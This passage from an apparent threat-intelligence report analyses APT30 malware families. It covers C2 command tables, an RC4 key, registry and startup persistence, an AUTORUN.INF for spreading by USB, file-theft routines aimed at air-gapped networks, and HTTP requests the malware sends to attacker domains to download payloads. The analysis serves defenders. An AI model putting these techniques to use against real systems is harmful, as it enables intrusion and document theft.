00 00 32 30 31 35 2d ........ ...2015000000B0 32 2d 32 20 31 37 3a 34 3a 33 32 00 00 00 00 00 2-2 17:4 :32.....\n000000C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n000000D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n000000E0 00 00 00 00 00 00 00 00 00 00 00 52 45 00 00 00 ........ ...RE...\n000000F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n00000100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n00000110 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n00000120 00 00 00 00 00 00 00 00 00 00 00 32 30 34 37 20 ........ ...2047\n00000130 4d 42 00 00 00 00 00 00 00 00 00 00 00 00 00 00 MB...... ........\n00000140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n00000150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n00000160 00 00 00 00 00 00 00 00 00 00 00        ........ ...\n\n```\n\nThe POST data consists of the following:\n\n**Table 13: NETEAGLE beacon contents**\n\n**Data** **Meaning**\n\n`a30bcf8bf956edbcbe0f8b6db835db26` Nd5 hash of the callback URL (http://www.autoapec[.]com/\nyzstmfa/pic1.bmp)\n\n`W7X64_ANALYSIS` Hostname of victim computer\n\n`c0 a8 38 6f` IP address of victim computer\n\n`2.18` Malware version\n\n`Winows XP 6.1 Build7601 Service Pack 1` OS Version (truncated 'W')\n\n`2015-2-2 17:4:32` Date / time from victim computer\n\n`RE` Active username from victim computer\n\n`2047 MB` Amount of memory on victim computer\n\n|Table 13: NETEAGLE beacon contents|Col2|\n|---|---|\n|Data|Meaning|\n|a30bcf8bf956edbcbe0f8b6db835db26|Nd5 hash of the callback URL (http://www.autoapec[.]com/ yzstmfa/pic1.bmp)|\n|W7X64_ANALYSIS|Hostname of victim computer|\n|c0 a8 38 6f|IP address of victim computer|\n|2.18|Malware version|\n|Winows XP 6.1 Build7601 Service Pack 1|OS Version (truncated 'W')|\n|2015-2-2 17:4:32|Date / time from victim computer|\n|RE|Active username from victim computer|\n\n\n-----\n\nNETEAGLE then requests the URL hxxp://www.autoapec.com/yzstmfa/pic2.bmp. The response is\nexpected to be less than 0x17 bytes (additional data, if received, is ignored) and is decrypted using the RC4\nkey “ScoutEagle”. The decrypted response consists of the following data:\n```\n            [Hostname (up to 15 bytes)]\\x00[IP address in network byte order][Port]\n\n```\nIf the hostname of the victim computer is listed in the decrypted response, the malware initiates a TCP\nconnection to the specified IP and port. This session is not encrypted. The C2 protocol consists of a 4 byte\nDWORD command ID. If the command ID takes an argument, a 4 byte DWORD identifying the length of the\nargument is sent.\n\n**Table 14: NETEAGLE “Scout” commands**\n\n**Command** **Meaning** **Command** **Meaning**\n\n`0x02` Sends \"NetEagle_Scout[hostname]\\x00\" `0x15` Get file attributes\n\n`0x03` List drives attached to the system (fixed, remote `0x16` Set file attributes\nand CDROM)\n\n`0x04` List directories `0x17` Get volume information\n\n`0x05` List directories with file details `0x18` Set the volume label\n\n`0x06` Rename a file or directory `0x19` Shell execute\n\n`0x07` Create file `0x20` Uninstall\n\n`0x08` Create directory `0x21` Search for file / directory\n\n`0x09` Delete file or directory `0x22` Sends “NETEAGLE_SCOUT”\n\n`0x10` Perform file operation `0x23` Get file information (size and last modified)\n\n`0x11` List directory contents `0x24` Establish a remote desktop session back to\ncontroller on TCP port 7519\n\n`0x12` Read file `0x25` Process listing\n\n`0x13` Write file `0x26` Read file\n\n`0x14` Get directory used space\n\nFinally, NETEAGLE downloads the URL hxxp://www.autoapec[.]com/yzstmfa/pic4.bmp. The response\nis decrypted with the same RC4 key (\"ScoutEagle\"). The format of the decrypted response is:\n```\n             [MD5 of file to be downloaded][URL]\n\n```\nNETEAGLE downloads the URL to %temp%\\Services.exe and executes the file.\n\n|Command|Meaning|Command|Meaning|\n|---|---|---|---|\n|0x02|Sends \"NetEagle_Scout[hostname]\\x00\"|0x15|Get file attributes|\n|0x03|List drives attached to the system (fixed, remote and CDROM)|0x16|Set file attributes|\n|0x04|List directories|0x17|Get volume information|\n|0x05|List directories with file details|0x18|Set the volume label|\n|0x06|Rename a file or directory|0x19|Shell execute|\n|0x07|Create file|0x20|Uninstall|\n|0x08|Create directory|0x21|Search for file / directory|\n|0x09|Delete file or directory|0x22|Sends “NETEAGLE_SCOUT”|\n|0x10|Perform file operation|0x23|Get file information (size and last modified)|\n|0x11|List directory contents|0x24|Establish a remote desktop session back to controller on TCP port 7519|\n|0x12|Read file|0x25|Process listing|\n|0x13|Write file|0x26|Read file|\n|0x14|Get directory used space|||\n\n\n-----\n\n###### NETEAGLE BACKDOOR – “NORTON” VARIANT\nThe “Norton” variants of the NETEAGLE backdoor (named for the mutex “Eagle-Norton360-OfficeScan”\nused by the malware) appear to have been developed later than that “Scout” versions, with early samples\ncompiled in 2013.\n\nThe NETEAGLE “Norton” sample 8a88f8803e8db8baee537a175960cdbe was compiled on 6 November\n2013. This version supports many of the same commands as the “Scout” version, but has several\ndifferences, including:\n\n- The “Norton” variant does not include its own persistence mechanism.[39]\n\n- Use of a different mutex (“Eagle-Norton360-OfficeScan”).\n\n- The “Norton” variant does not support the various HTTP requests to download and execute files\n(e.g., allupdate.xml, update.xml, updateapp.xml, and pic4.bmp).\n\n- Although the “Norton” variant checks whether the victim host uses a proxy configuration, it always\n\nbeacons using a proxy request. [40]\n\n- Different encoding method for strings (“Norton” adds 2 instead of 4).\n\n- Support of different / additional commands (see below).\n\n- Support for loading DLLs for additional functionality.\n\nThe NETEAGLE “Norton” variant uses a similar process to identify its second-stage C2 server. The\nmalware requests the file pic1.bmp from its first-stage C2 server using the following HTTP request:\n\n\n**Figure 31: NETEAGLE \"Norton\" HTTP request**\n```\nGET /update1/pic1.bmp HTTP/1.1\nUser-Agent: [filename of malware]\nHost: www.creammemory.com\nCache-Control: no-cache\n\n```\n\nSimilar to the “Scout” variant, the response is decrypted using the RC4 key “ScoutEagle” to obtain the IP\naddress of the beacon server. The beacon format is the same as that used by the “Scout” variant.\n\nThe NETEAGLE “Norton” variant will request the URL hxxp://www.creammemory[.]com/update1/pic2.\n```\nbmp and decrypt the response with the RC4 key “ScoutEagle”. The expected response format is the same\n\n```\nas that for the “Scout” variant:\n```\n[Hostname (up to 15 bytes)]\\x00[Redirect IP in network byte order][Port]\n\n```\n\n-----\n\nThe NETEAGLE “Norton” variant supports most of the same commands as the “Scout” variant, with the\nfollowing exceptions:\n\n**Table 15: NETEAGLE \"Norton\" commands that differ from \"Scout\" variant**\n\n**Command** **Meaning**\n\n`0x20` Not implemented.\n\n`0x24` Load a DLL and call the DoWork export using DoWork([C2 IP], 81, 4003, 4004). The\nencoded string representing the DLL filename does not decode correctly (\"PCo^jb+aii\",\npossibly intended to be \"SFrame.dll\").\n\n`0x26` Not implemented.\n\n`0x27` Load a DLL and call the DoWork export using DoWork([C2 IP], 82, 4015, 4016). The\nencoded string representing the DLL filename does not decode correctly (\"PJrifq+aii\",\npossibly intended to be \"SMulit.dll\").\n\n`0x28` Load a DLL and call the DoWork export using DoWork([C2 IP], 83, 4005, 4006). The\nencoded string representing the DLL filename does not decode correctly (\"PQikq+aii\",\npossibly intended to be \"STlnt.dll\").\n\n`0x29` Load a DLL and call the DoWork export using DoWork([C2 IP], 84, 4009, 4010). The\nencoded string representing the DLL filename does not decode correctly (\"PQikq+aii\",\npossibly intended to be \"SProc.dll\").\n\n###### MALWARE TARGETING REMOVABLE DRIVES\nAPT30 uses three pieces of malware that are believed to have been designed to propagate to removable\ndrives with the intent of eventually infecting and stealing data from computers located on air-gapped\nnetworks.\n\n###### SHIPSHAPE\nSHIPSHAPE samples have been identified with compile times as early as 2006 and as recently as 2014.\nSHIPSHAPE initially targets removable and fixed drives with less than a specific amount of space available\nto the SHIPSHAPE process. Earlier samples required less than 1,000,000,000 bytes (~1GB); the sample\ndescribed in detail below requires less than 10,000,000,000 bytes (0x2540BE400) or approximately\n10GB.[41] The intent is likely to use the drive to spread malware to additional systems.\n\nThe sample f18be055fae2490221c926e2ad55ab11 was compiled on 23 August, 2012. The malware\nreplaces files and folders on targeted drives with executable files from specified paths on the SHIPSHAPEinfected system. [42] The specific files and folders replaced may vary based on the SHIPSHAPE sample. [43]\nTargeted files and folders are marked as hidden; SHIPSHAPE copies the specified executable file or files to\nthe removable drive using the same names as the targeted files and folders, but with an .exe extension (for\nexample, if the drive contained the file MyDocument.doc, SHIPSHAPE would create a file with the name\n```\nMyDocument.doc.exe. A user attempting to access a “document” on the removable drive would potentially\n\n```\nbe tricked into running the executable instead. It is believed that the executable will open the original\ndocument or folder when executed, to disguise the fact that malicious activity is occurring.\n\n|Command|Meaning|\n|---|---|\n|0x20|Not implemented.|\n|0x24|Load a DLL and call the DoWork export using DoWork([C2 IP] , 81, 4003, 4004). The encoded string representing the DLL filename does not decode correctly (\"PCo^jb+aii\", possibly intended to be \"SFrame.dll\").|\n|0x26|Not implemented.|\n|0x27|Load a DLL and call the DoWork export using DoWork([C2 IP] , 82, 4015, 4016). The encoded string representing the DLL filename does not decode correctly (\"PJrifq+aii\", possibly intended to be \"SMulit.dll\").|\n|0x28|Load a DLL and call the DoWork export using DoWork([C2 IP] , 83, 4005, 4006). The encoded string representing the DLL filename does not decode correctly (\"PQikq+aii\", possibly intended to be \"STlnt.dll\").|\n|0x29|Load a DLL and call the DoWork export using DoWork([C2 IP] , 84, 4009, 4010). The encoded string representing the DLL filename does not decode correctly (\"PQikq+aii\", possibly intended to be \"SProc.dll\").|\n\n\n-----\n\nWhen executed, SHIPSHAPE creates the mutex \"MicrosoftShipZJ\". The malware copies itself to\n```\n%HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\IDE\\MSDEV.EXE. For persistence, SHIPSHAPE\n\n```\ncreates a shortcut in the user’s Startup folder named \"Visual Studio.lnk\" using the comment \"Visual\nStudio 2005\" and a target path of %HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\IDE\\MSDEV.\n```\nEXE (variable is expanded).\n\n```\nThe malware creates the registry key HKEY_LOCAL_MACHINE\\Software\\Microsoft\\ShipUp with the\nfollowing value and data:\n\nValue: lnk\nData: Wjtvbm!Tuvejp/mol\n\nThe data is the encoded name of the malware’s shortcut file (in this case, “Visual Studio.lnk”); the\nhexadecimal value of each character in the original file name is incremented by one (so “V” (0x56)\nbecomes “W” (0x57), etc.).\n\nSHIPSHAPE disables AutoRun and hides both hidden files and file extensions by setting the following\nregistry values:\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\NoDriveTypeAutoRun = 0x9f\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden = 0x02\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt = 0x01\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\\nCheckedValue = 0x00\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\HideFileExt\\\nCheckedValue = 0xffffffff\n\n```\nSHIPSHAPE searches for fixed and removable drives (DRIVE_FIXED, DRIVE_REMOVABLE). If a detected\ndrive is less than 10,000,000,000 bytes (10GB) in size or was attached to the system after SHIPSHAPE\nperformed its initial drive scan, SHIPSHAPE looks for the file ldupver.txt on the drive and parses the file\nfor version information if the file is present. If the version listed in the file is greater than the malware’s\ncurrent version (\"50\" for this sample), SHIPSHAPE will look for the file AUTORUN.INF on the drive and\nexecute the \"open\" variable from the file, likely in an attempt to self-update.\n\nSHIPSHAPE will create (or update, if already present), the following AUTORUN.INF file on the drive:\n```\n[AutoRun]\nopen=keybd.exe\nshellexecute=keybd.exe\nshell\\Auto\\command=keybd.exe\nshell=Auto\n\n```\nIn addition, for drives that pass the size check (e.g., less than 10GB), SHIPSHAPE modifies folders and\nfiles on the drive with the .doc or .docx extension. SHIPSHAPE sets the hidden attribute on the original\nfolder or file and copies a new file to the drive using the same name with an .exe extension. For folders,\nSHIPSHAPE copies the contents of the file KB925273-dir.log from the SHIPSHAPE-infected computer\nto the drive; for files, SHIPSHAPE copies the contents of the file KB936891-doc.log. The malware will\nskip over any paths on the drive beginning with XP-Update, msdn, Recycled, or $LDDATA$. [44]\n\n\n-----\n\nSHIPSHAPE may use the following files (where [Install Path] is the path where SHIPSHAPE is\ninstalled on the victim computer:\n\n**Table 16: Files used by SHIPSHAPE malware**\n\n**File** **Action**\n\n`[Install Path]\\KB914268-inf.log` Copied to keybd.exe on the removable disk\nCopied to [Install Path]\\vers.ini\n\n`[Install Path]\\KB925273-dir.log` Replaces directories on removable disk\n\n`[Install Path]\\KB936891-doc.log` Replaces .doc, .docx files on removable disk\n\n`[Install Path]\\ldjs.txt` Activity log\n\n`upnum.txt` Present in malware strings, but not used by this version\n\n`[Install Path]\\KB952567-mouse.log` List of paths to be created on the removable disk and the files\nto be copied\n\n`[Install Path]\\NameList.doc` Copied to the root of the removable disk\n\n`ldupver.txt` Used to store a version number (“50” for this variant) on a\nremovable disk.\n\n###### SPACESHIP\nSimilar to SHIPSHAPE, SPACESHIP samples have been identified with compile times ranging from\n2006 to 2014. SPACESHIP searches for files with a specified set of file extensions and copies them to\na removable drive. FireEye believes that SHIPSHAPE is used to copy SPACESHIP to a removable drive,\nwhich could be used to infect another victim computer, including an air-gapped computer. SPACESHIP is\nthen used to steal documents from the air-gapped system, copying them to a removable drive inserted\ninto the SPACESHIP-infected system.\n\nThe SPACESHIP sample 11876eaadeac34527c28f4ddfadd1e8d was compiled on 23 August,\n2012. When executed, the malware creates two events named \"MicrosoftShipTrExit\" and\n\"MicrosoftShipTrHaveExit\" along with a mutex named \"MicrosoftShipTrZJ\".\n\nThe malware copies itself to %HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\VFP6.\n```\nEXE. To maintain persistence, the malware creates a shortcut in the user’s Startup folder named VFP6.\nlnk using the comment \"Visual FoxPro\" and the target path %HOMEPATH%\\My Documents\\Visual Studio\n2005\\MSDEV\\FoxPro\\VFP6.EXE (all %HOMEPATH% references are expanded).\n\n```\nAs part of the installation process, SPACESHIP creates the registry key HKEY_LOCAL_MACHINE\\Software\\\n```\nMicrosoft\\ShipTr with the following value and data:\n\n```\nValue: lnk\n\nData: WGQ7/mol\n\n|File|Action|\n|---|---|\n|[Install Path]\\KB914268-inf.log|Copied to keybd.exe on the removable disk Copied to [Install Path]\\vers.ini|\n|[Install Path]\\KB925273-dir.log|Replaces directories on removable disk|\n|[Install Path]\\KB936891-doc.log|Replaces .doc, .docx files on removable disk|\n|[Install Path]\\ldjs.txt|Activity log|\n|upnum.txt|Present in malware strings, but not used by this version|\n|[Install Path]\\KB952567-mouse.log|List of paths to be created on the removable disk and the files to be copied|\n|[Install Path]\\NameList.doc|Copied to the root of the removable disk|\n|ldupver.txt|Used to store a version number (“50” for this variant) on a removable disk.|\n\n\n-----\n\nSimilar to other APT30 malware, the data is the name of SPACESHIP’s shortcut file, with each character\nincremented by one.\n\nSPACESHIP also creates the following directories:\n```\n%HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\Docs\n%HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\Docs\\ldf\n\n```\nSPACESHIP first scans for files matching the pattern ldmap*.* in %HOMEPATH%\\Documents\\Visual\n```\nStudio 2005\\MSDEV\\FoxPro\\Docs\\ldf. If a file is not found or is too old, the malware deletes the files\nldmap.txt and Info.txt[45] from %HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\\nDocs\\. The malware then recursively scans each directory and logs all files contained in each folder (file\n\n```\nsize and last modified) in a new Info.txt file.\n\nSPACESHIP will look for configuration data stored in the file %HOMEPATH%\\My Documents\\Visual Studio\n```\n2005\\MSDEV\\FoxPro\\ld.ini. The malware extracts the following keys from the sections:\n[DirMap]\nGetIt=[Integer]\n[Piece]\nSize=[Integer]\n[UpData]\nDirAndType=[String]\n[UpDataTime]\nDay=[Integer]\n\n```\nSPACESHIP will scan the folders \"My Documents\" (CSIDL_PERSONAL), \"Desktop\" (CSIDL_DESKTOP), and\n“My Recent Documents\" (CSIDL_RECENT; the malware parses the .lnk file target paths for specified file\ntypes) and will search for files with the following extensions:\n\n**Table 17: SPACESHIP targeted file extensions**\n\n|File Extension|Document Type|\n|---|---|\n|.doc|Microsoft Word document|\n|.docx|Microsoft Word document|\n|.max|MAX source code file (?)|\n|.pdf|Adobe Acrobat Portable Document Format|\n|.pgp|Pretty Good Privacy|\n|.rhs|unknown|\n|.rtf|Rich Text Format|\n|.tif|Tagged Image Format graphics file|\n|.wpd|Word Perfect Document|\n\n\n-----\n\nSPACESHIP can also target files based on the last modified date using the UpDataTime/Day in the ld.ini\nconfiguration file.\n\nIdentified files are copied to the %HOMEPATH%\\Visual Studio 2005\\MSDEV\\FoxPro\\Docs\\ldf directory\nand saved with an .ldf extension. The .ldf files are first compressed using zlib then each byte is rotated\n4 positions and XOR-encoded with 0x23.\n\nSPACESHIP monitors for removable drives to be inserted into the system. When a drive is attached,\nSPACESHIP checks for the presence of specific files on the removable drive.\n\nIf the file [Drive Letter]:\\msdn\\d.ini is found, SPACESHIP copies it to %HOMEPATH%\\Documents\\\n```\nVisual Studio 2005\\MSDEV\\FoxProld.ini.[46]\n\n```\nIf the file [Drive Letter]:\\msdn\\KB947652-ver.log is present, SPACESHIP copies it to %HOMEPATH%\\\n```\nDocuments\\Visual Studio 2005\\MSDEV\\FoxPro\\KB947652-ver.log. SPACESHIP reads the contents\n\n```\nof the file and compares it with its current version (the string \"5.0” for this variant). If the strings do\nnot match, SPACESHIP copies [Drive Letter]:\\XP-Update\\KB863113-ld.log to %HOMEPATH%\\\n```\nDocuments\\Visual Studio 2005\\MSDEV\\FoxPro\\~ld.exe and executes the file.\n\n```\nSPACESHIP copies files in the %HOMEPATH%\\Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\Docs\\ldf\ndirectory to the removable drive in the folder [Drive Letter]:\\Recycled. A desktop.ini file is created\nthat configures the directory to be opened using Recycler instead of Windows Explorer; this prevents a\nuser from seeing the copied files using Windows Explorer.\n\n###### FLASHFLOOD\nFLASHFLOOD appears to be an older piece of malware, or possibly one less frequently found “in the\nwild”; identified samples were compiled as early as 2005, but are less common (or nonexistent?) after\n2009. FLASHFLOOD has some similarities to SPACESHIP, in that it will search for and archive files that\nmatch a configurable pattern; it even uses the same encoding process on archived files. One difference is\nthat FLASHFLOOD will scan inserted removable drives for targeted files, and copy those files from the\nremovable drive to the FLASHFLOOD-infected system. This may simply be yet another means to identify\n**any “interesting” files for data theft, including those that happen to reside on a removable drive inserted**\ninto the victim computer. Alternately, FLASHFLOOD may have been designed to copy files that had been\nplaced on a removable drive (perhaps by SPACESHIP), possibly copied from an “interesting” location\nsuch as an air-gapped network. This theory is bolstered by the fact that one of the default file extensions\nsearched for by FLASHFLOOD is .ldf, the extension used by SPACESHIP for copied and encoded files.\n\nFLASHFLOOD may also log or copy additional data from the victim computer, such as system information\nor contacts.\n\nThe FLASHFLOOD sample 5d4f2871fd1818527ebd65b0ff930a77 was compiled on 17 February, 2009.\nWhen executed, the malware creates a mutex named \"MicrosoftFlashZJ\" and also creates two events\nnamed \"MicrosoftFlashExit\" and \"MicrosoftFlashHaveExit\". If the following registry key is not\npresent, the malware creates it and continues the installation process:\n\nKey: HKLM\\Software\\Microsoft\\GetInf\n\nValue: pid\n\n\n-----\n\nData: [Encoded filename of implant]\n\nThe filename is encoded by incrementing the hex value of each ASCII character by one.\n\nFLASHFLOOD copies itself to the file C:~a, then copies that file to %SystemDrive%\\Program Files\\\n```\nOutlook Express\\msinm.exe. The malware changes to the target directory, executes msinm.exe and\n\n```\nexits.\n\nTo maintain persistence, FLASHFLOOD creates the following registry value:\n\nKey: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nValue: msinm.exe\n\nData: [Path to install]\n\nFLASHFLOOD attempts to read the file %WINDIR%\\FILETYPE.INI for a list of file patterns of interest. If\nthe file does not exist the malware uses the following default file extensions:\n\n**Table 18: Default file extensions searched for by FLASHFLOOD**\n\n**File Extension** **Document Type**\n\n`.doc` Microsoft Word document\n\n`.docx` Microsoft Word document\n\n`.ldf` File extension used by SPACESHIP for copied and encoded files\n\n`.max` Autodesk 3ds Max CAD file\n\n`.pdf` Adobe Acrobat Portable Document Format\n\n`.pgp` Pretty Good Privacy\n\n`.rhs` unknown\n\n`.rtf` Rich Text Format\n\n`.tif` Tagged Image Format graphics file\n\n`.wpd` Word Perfect Document\n\nFLASHFLOOD creates the following directories, used to store malware log data and copied files of\ninterest:\n```\n%WINDIR%\\$NtUninstallKB885884$\\\n%WINDIR%\\$NtUninstallKB885884$\\FlashFiles\n%WINDIR%\\$NtUninstallKB885884$\\LastFiles\n%WINDIR%\\$NtUninstallKB885884$\\RecentFiles\n\n```\n|Table 18: Default|file extensions searched for by FLASHFLOOD|\n|---|---|\n|File Extension|Document Type|\n|.doc|Microsoft Word document|\n|.docx|Microsoft Word document|\n|.ldf|File extension used by SPACESHIP for copied and encoded files|\n|.max|Autodesk 3ds Max CAD file|\n|.pdf|Adobe Acrobat Portable Document Format|\n|.pgp|Pretty Good Privacy|\n|.rhs|unknown|\n|.rtf|Rich Text Format|\n|.tif|Tagged Image Format graphics file|\n|.wpd|Word Perfect Document|\n\n\n-----\n\nDuring initialization, FLASHFLOOD queries the registry value HKLM\\SYSTEM\\\n```\nCurrentControlSet\\Services\\SENS\\Parameters\\ServiceDll and logs the result to\n%WINDIR%\\$NtUninstallKB885884$\\Info.txt.[47] The file Info.txt is a general log file used by\n\n```\nFLASHFLOOD to store information collected from the system.\n\nFLASHFLOOD also logs information stored in the Windows Address Book using the IAddrBook\ninterface.[48 ]Information logged includes User, Nick, E-mail and Type.\n\nFLASHFLOOD parses the shortcut (.lnk) files from the user’s \"My Recent Documents\" folder and\narchives the target files to %WINDIR%\\$NtUninstallKB885884$\\RecentFiles. The malware uses the same\nformat for archiving files as SPACESHIP; the original files are copied and an .ldf extension is added. The\nfiles are then zlib compressed and each byte is rotated 4 positions and XOR-encoded with 0x23.\n\nFLASHFLOOD creates the file %WINDIR%\\FILETIME.DAT and writes the current system time to the file in\nFILETIME format. [49] The file is likely used to ensure the malware collects only recent files.\n\nFLASHFLOOD scans connected drives and the directories \"Desktop\", \"Temporary Internet Files\" and\n\"TEMP\" for files that match the patterns of interest (obtained from FILETYPE.INI or the default set of\nfile extensions). Matching files are archived to %WINDIR%\\$NtUninstallKB885884$\\LastFiles.\n\nFor drives attached to the system after FLASHFLOOD initially executes, the malware scans for files\nmatching the patterns of interest. The malware’s behavior differs slightly depending on the size of the\ndetected drive.\n\nFor drives with a capacity less than 2,500,000,000 bytes (approximately 2.5 GB),[50]\nFLASHFLOOD scans the entire drive and will archive any files of interest found on the drive to\n```\n%WINDIR%\\$NtUninstallKB885884$\\FlashFiles, using the archive method (compress, rotate bytes,\n\n```\nXOR) described above. For any files found in the $LDDATA$ or RECYCLED directories, FLASHFLOOD will\ncopy the file directly [51] (no archiving is performed) and delete the original file from the detected drive.\n\nFor drives with a capacity greater than 2,500,000,000 bytes, FLASHFLOOD will only scan the\ndirectories $LDDATA$ and RECYCLED (if present). Any files found in these directories are copied to\n```\n%WINDIR%\\$NtUninstallKB885884$\\FlashFiles and the original files are deleted.\n\n```\nIn both cases, details of the scan are logged to %WINDIR%\\$NtUninstallKB885884$\\OtherInfo.txt.\n\n###### MISCELLANEOUS TOOLS\nIn addition to the malware listed above, APT30 has used a variety of droppers, downloaders, and other\nutilities. In some cases, instead of directly installing a backdoor via a malicious document, APT30 will\ninstall a stage one downloader that attempts to retrieve a second stage backdoor (often NETEAGLE) from\na specified location.\n\n###### MILKMAID / ORANGEADE Droppers and CREAMSICLE Downloader\nMILKMAID and ORANGEADE are two dropper families typically installed via a malicious attachment, such\nas a malicious Word document. Both droppers have been observed to drop variants of the CREAMSICLE\ndownloader. MILKMAID drops a variant of CREAMSICLE implemented as a stand-alone executable, where\nthe slightly older ORANGEADE drops a variant of CREAMSICLE implemented as a DLL. [52]\n\n\n-----\n\nEach dropper extracts its version of CREAMSICLE and creates a shortcut (.lnk) file that references the\nfile to be downloaded by CREAMSICLE; that is, the dropper sets up persistence for the second stage\ndownloaded file.\n\n“India deploys world's largest military transport plane.doc” (md5 hash\n```\n7d775a39ecd517cee4369c672e0e4da7) is an example of an exploit document – one built with a common\n\n```\ndocument weaponizer that appears to be shared across multiple threat groups – that drops MILKMAID\nand the EXE variant of CREAMSICLE. The document creates the file firefox.exe (MILKMAID) and a nonmalicious decoy document (Wor.doc) in the user’s %TEMP% directory, executes firefox.exe, and displays\nthe non-malicious document. MILKMAID extracts a compressed PE (readme.lz) from its resource\nsection, decompresses it, and writes it to %APPDATA%\\Norton360\\Engine\\5.1.0.29 as wssfmgr.exe\n(CREAMSICLE).\n\nMILKMAID creates the shortcut file Symantec LiveUpdate.lnk in the user’s Startup folder\n(%USERPROFILE%\\Start Menu\\Programs\\Startup) with the target path %APPDATA%\\Norton360\\\n```\nEngine\\5.1.0.29\\ccSvcHst.exe (%APPDATA% is expanded). Finally, MILKMAID launches CREAMSICLE\n\n```\n(wssfmgr.exe).\n\nCREAMSICLE attempts to download an encoded executable from a specified location using the following\nHTTP request:\n\n\n**Figure 32: CREAMSICLE download request**\n```\nGET /stactivex/update1.htm HTTP/1.1\nUser-Agent: Microsoft Internet Explorer\nHost: www.creammemory.com\nCache-Control: no-cache\n\n```\n\nThe downloaded file is decoded, written to disk as %APPDATA%\\Norton360\\Engine\\5.1.0.29\\ccSvcHst.\n```\nexe, and padded with 51,200,000 null bytes. CREAMSICLE does not appear to execute the downloaded\n\n```\nfile, presumably relying on Windows to do so (using the shortcut file in the user’s Startup folder) the next\ntime the user logs in.\n\n###### BACKBEND and GEMCUTTER Downloaders\nBACKBEND and GEMCUTTER are older downloaders that have been previously used by APT30.\n\n###### BACKBEND\nBACKBEND is a secondary downloader used as a backup mechanism in the case the primary backdoor\nis removed. The BACKBEND sample af504e86416c5f643e96f6e5e69566f0 was compiled on 16\nAugust 2007. When executed, BACKBEND checks for the presence of the mutexes MicrosoftZj or\n```\nMicrosoftZjBak (both associated with BACKSPACE variants). If either of the mutexes exist, the malware\n\n```\nexits.\n\n\n-----\n\nIf BACKBEND is not running from the C:\\Program Files\\Internet Explore folder as iexplore.exe, it\ncreates the folder and copies itself as iexplore.exe to that location.\n\nNext, if the current execution path of the malware process is not <CSIDL_STARTUP>\\Update.exe, [53] it\ncopies itself to that location to achieve persistence. Finally, BACKBEND starts the C:\\Program Files\\\n```\nInternet Explore\\iexplore.exe process by providing the current path of the malware as the first\n\n```\ncommand line parameter.\n\nIf the malware process executable file path is C:\\Program Files\\Internet Explore\\iexplore.exe,\nBACKSPACE deletes the file given by the first command line parameter passed in. Then, the malware\ndownloads a file from hxxp://www.cbkjdxf[.]com/04-1/04-1.htm and saves it under Windows\ndirectory as netsvc.exe. [54] BACKSPACE starts a new process using the full path of the downloaded file\n(%windir%\\netsvc.exe) and deletes <CSIDL_STARTUP>\\Update.exe.\n\n###### GEMCUTTER\nGEMCUTTER is used in a similar capacity as BACKBEND, but maintains persistence by creating a\nWindows registry run key.\n\nThe GEMCUTTER sample bf8616bbed6d804a3dea09b230c2ab0c was compiled on 15 February, 2009.\nThe malware starts by creating MicrosoftGMMExit and MicrosoftGMMHaveExit as non-signaled events.\nGEMCUTTER then queries for the registry value HKEY_LOCAL_MACHINE\\Software\\Microsoft\\GetMM\\\n```\npid. If the value does not exist, the malware sets the registry value to the encoded malware process\n\n```\nfilename (each filename character incremented by one).\n\nGEMCUTTER checks for the presence of the mutex MicrosoftGMMZJ to ensure only one copy of\nGEMCUTTER is executing. If the mutex doesn't exist, the malware creates it and continues execution;\notherwise, the malware signals the MicrosoftGMMExit event.\n\nThe malware performs cleanup by deleting the registry value with the same name as the malware\nfilename under the HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry\nkey and the file with the same name as the malware itself in the %sysdir% directory.\n\nIf GEMCUTTER is not running from %sysdir% as CTFM0N.xxx (the file extension is excluded in the check),\nthe malware copies itself to that location. The malware then starts a new process by providing %sysdir%\\\n```\nCTFM0N.exe as the executable file path, and the current process exits.\n\n```\nIf GEMCUTTER is running from %sysdir% as CTFM0N.xxx, the malware creates a new registry value\nunder HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, with the value and\ndata set to CTFM0N.EXE. The registry value HKEY_LOCAL_MACHINE\\Software\\Microsoft\\GetMM\\pid is set\nto the DUGN1O/fyf (CTFM0N.EXE with each character incremented by 1).\n\nGEMCUTTER checks for the existence of the mutex MicrosoftZj (associated with BACKSPACE). If the\nmutex doesn't exist, GEMCUTTER downloads a file from hxxp://www.lisword[.]com/HM/Update.htm\nand saves it under %windir% as netsvc.exe. A new process is started using %windir%\\netsvc.exe[55] as\nthe executable file path.\n\n\n-----\n\n###### APPENDIX B   MD5 HASHES\n\nBelow are md5 hash values for a representative sample of APT30 malware.\n\n|MD5 Hash|Malware 